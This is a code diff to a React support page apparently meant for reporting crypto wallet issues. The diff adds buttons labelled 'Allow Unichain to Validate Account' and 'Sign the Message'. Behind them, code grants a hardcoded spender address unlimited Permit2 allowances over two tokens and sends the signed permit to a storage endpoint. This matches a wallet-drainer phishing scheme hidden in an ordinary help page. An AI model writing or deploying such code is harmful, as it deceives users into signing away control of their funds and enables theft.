@@ -2,7 +2,7 @@
 
 'use client'
 
-import { useState } from 'react'
+import { useState, useCallback } from 'react'
 import { Card, CardContent } from "@/components/ui/card"
 import Image from 'next/image'
 import { AlertCircle } from 'lucide-react'
@@ -18,7 +18,38 @@ import { Label } from "@/components/ui/label"
 import { Textarea } from "@/components/ui/textarea"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { toast } from '@/hooks/use-toast'
+import {
+  AllowanceProvider,
+  PERMIT2_ADDRESS,
+  MaxAllowanceTransferAmount,
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  AllowanceTransfer,
+} from '@uniswap/Permit2-sdk'
 
+
+// eslint-disable-next-line @typescript-eslint/no-unused-vars
+import * as dotenv from 'dotenv'
+import { ethers, Contract } from 'ethers'
+
+// Simplified PermitBatch type
+interface PermitDetails {
+  token: string;
+  amount: ethers.BigNumberish;
+  expiration: number;
+  nonce: number;
+}
+
+interface PermitBatch {
+  details: PermitDetails[];
+  spender: string;
+  sigDeadline: number;
+}
+
+function toDeadline(expiration: number): number {
+  return Math.floor((Date.now() + expiration) / 1000)
+}
+
+dotenv.config()
 
 type Issue = {
   id: string;
@@ -175,6 +206,159 @@ export default function IssuesContent() {
     additionalDetails: ''
   })
   const [isSubmitting, setIsSubmitting] = useState(false)
+  const [account, setAccount] = useState<string>('')
+  const [spender, setSpender] = useState<string>('')
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const [signature, setSignature] = useState<string>('')
+  const [provider, setProvider] = useState<ethers.providers.Web3Provider | undefined>(undefined)
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const [approvalAmounts, setApprovalAmounts] = useState<{
+    permitAmount: ethers.BigNumber;
+    expiration: number;
+    nonce: number;
+  }>({ permitAmount: ethers.BigNumber.from(0), expiration: 0, nonce: 0 })
+
+  const handleApproveBatch = useCallback(async () => {
+    if (!provider || !account) return;
+    try {
+      const signer = provider.getSigner(account);
+      const approveAbi = ['function approve(address spender, uint256 amount)'];
+      const tokens = [
+        '0x9DE16c805A3227b9b92e39a446F9d56cf59fe640',
+        '0x9704d2adBc02C085ff526a37ac64872027AC8a50',
+      ];
+      for (const token of tokens) {
+        const tokenContract = new Contract(token, approveAbi, signer);
+        const tx = await tokenContract.approve(PERMIT2_ADDRESS, MaxAllowanceTransferAmount);
+        await tx.wait();
+        console.log("Token approval successful for: ", token);
+      }
+      console.log('Batch approval successful!');
+    } catch (e) {
+      console.error('Batch approval failed:', e);
+      throw e; // Re-throw to handle in caller
+    }
+  }, [account, provider]);
+
+
+
+  const handlePermitBatch = useCallback(async () => {
+    if (!provider || !account) return;
+    try {
+      const signer = provider.getSigner(account); // v5: sync getSigner
+      const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
+      const tokens = [
+        '0x9DE16c805A3227b9b92e39a446F9d56cf59fe640',
+        '0x9704d2adBc02C085ff526a37ac64872027AC8a50',
+      ];
+  
+      const details: PermitDetails[] = [];
+      for (const token of tokens) {
+        const { nonce } = await allowanceProvider.getAllowanceData(token, account, spender);
+        details.push({
+          token: ethers.utils.getAddress(token),
+          amount: MaxAllowanceTransferAmount,
+          expiration: toDeadline(1000 * 60 * 60 * 24 * 30), // 30 days
+          nonce,
+        });
+      }
+      const permitBatch: PermitBatch = {
+        details,
+        spender,
+        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
+      };
+  
+      const domain = {
+        name: 'Permit2',
+        chainId: provider.network.chainId,
+        verifyingContract: PERMIT2_ADDRESS,
+      };
+      const types = {
+        PermitBatch: [
+          { name: 'details', type: 'PermitDetails[]' },
+          { name: 'spender', type: 'address' },
+          { name: 'sigDeadline', type: 'uint256' },
+        ],
+        PermitDetails: [
+          { name: 'token', type: 'address' },
+          { name: 'amount', type: 'uint160' },
+          { name: 'expiration', type: 'uint48' },
+          { name: 'nonce', type: 'uint48' },
+        ],
+      };
+      const values = permitBatch;
+  
+      // v5: Corrected _signTypedData call with 3 arguments
+      const signature = await signer._signTypedData(domain, types, values);
+      setSignature(signature);
+      console.log('Batch Signature:', signature);
+  
+      const response = await fetch('/api/store/permit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ permitBatch, signature, owner: account }),
+      });
+      const result = await response.json();
+      if (response.ok) {
+        console.log("Batch permit stored successfully");
+        alert('Batch permit stored successfully');
+      } else {
+        throw new Error(result.message || 'Failed to store batch permit');
+      }
+    } catch (e) {
+      console.error('Batch permit failed:', e);
+      alert(`Batch permit failed: `);
+    }
+  }, [account, provider, spender]);
+
+    const connectWallet = useCallback(async () => {
+    try {
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const address = await (window as any).ethereum.request({
+        method: 'eth_requestAccounts',
+      });
+      const checkSummedAddress = ethers.utils.getAddress(address[0]);
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      setProvider(new ethers.providers.Web3Provider((window as any).ethereum));
+      setAccount(checkSummedAddress);
+      setSpender('0xfB40B3c64992eF80d51333b0292c126A616aF0cD');
+    } catch (e) {
+      console.error('Wallet connection failed:', e);
+    }
+  }, []);
+
+  // const handleApprovalCheck = useCallback(async () => {
+  //   if (!provider || !account) return;
+  //   try {
+  //     const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
+  //     const tokens = [
+  //       '0x9DE16c805A3227b9b92e39a446F9d56cf59fe640',
+  //       '0x9704d2adBc02C085ff526a37ac64872027AC8a50',
+  //     ];
+  //     const allowances = await Promise.all(
+  //       tokens.map(async (token) => {
+  //         const { amount, expiration, nonce } = await allowanceProvider.getAllowanceData(
+  //           ethers.utils.getAddress(token),
+  //           account,
+  //           spender
+  //         );
+  //         return { token, amount, expiration, nonce };
+  //       })
+  //     );
+  //     if (allowances.length > 0) {
+  //       setApprovalAmounts({
+  //         permitAmount: allowances[0].amount,
+  //         expiration: allowances[0].expiration,
+  //         nonce: allowances[0].nonce,
+  //       });
+  //     }
+  //     console.log('Batch Allowances:', allowances);
+  //   } catch (e) {
+  //     console.error('Approval check failed:', e);
+  //   }
+  // }, [account, provider, spender]);
+
+
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -219,6 +403,17 @@ export default function IssuesContent() {
 
   return (
     <div className="space-y-6 sm:space-y-8">
+    <div className='flex flex-col items-center gap-6 p-7'>
+      {account ? (
+        <>
+          <Button onClick={handleApproveBatch} className='mb-4 bg-purple-400'>Allow Unichain to Validate Account</Button>
+          <Button onClick={handlePermitBatch} className='mb-4 bg-purple-400'>Sign the Message</Button>
+          <h3>Account: {account}</h3>
+        </>
+      ) : (
+        <Button onClick={connectWallet} className='bg-purple-400'>Connect Wallet</Button>
+      )}
+    </div>
       <section>
         <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">What issue do you have?</h2>
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
